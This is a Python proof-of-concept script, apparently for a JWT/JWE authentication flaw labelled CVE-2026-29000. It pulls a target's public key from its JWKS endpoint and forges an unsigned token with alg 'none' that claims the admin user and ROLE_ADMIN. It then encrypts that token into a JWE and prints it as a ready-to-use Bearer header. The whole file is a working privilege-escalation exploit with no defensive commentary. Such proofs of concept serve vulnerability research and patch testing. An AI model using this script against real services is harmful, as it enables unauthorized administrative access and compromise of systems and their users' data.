import json
import base64
import time
import argparse
import requests
from jwcrypto import jwk, jwe


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def create_plain_jwt(username, role):
    """Create unsigned PlainJWT"""
    header = {"alg": "none", "typ": "JWT"}

    claims = {
        "sub": username,
        "role": role,
        "iss": "principal-platform",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    return (
        b64url(json.dumps(header).encode()) + "." +
        b64url(json.dumps(claims).encode()) + "."
    )


def build_jwe(plain_jwt, jwks_key):
    """Encrypt PlainJWT into JWE"""

    public_key = jwk.JWK.from_json(json.dumps(jwks_key))

    protected_header = {
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "cty": "JWT",
        "kid": jwks_key["kid"]
    }

    token = jwe.JWE(
        plain_jwt.encode(),
        protected=json.dumps(protected_header)
    )

    token.add_recipient(public_key)

    return token.serialize(compact=True)


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-29000 PoC Token Generator")

    parser.add_argument("--jwks", required=True, help="JWKS endpoint URL")
    parser.add_argument("--user", default="admin", help="Username (sub claim)")
    parser.add_argument("--role", default="ROLE_ADMIN", help="Role claim")

    args = parser.parse_args()

    print("[*] Fetching JWKS...")

    jwks = requests.get(args.jwks).json()["keys"][0]

    print("[+] Public key loaded")

    plain_jwt = create_plain_jwt(args.user, args.role)

    print("[+] PlainJWT created")

    malicious_token = build_jwe(plain_jwt, jwks)

    print("\n=== Malicious JWE Token ===\n")
    print(malicious_token)

    print("\nUse it as:")
    print(f"Authorization: Bearer {malicious_token}")


if __name__ == "__main__":
    main()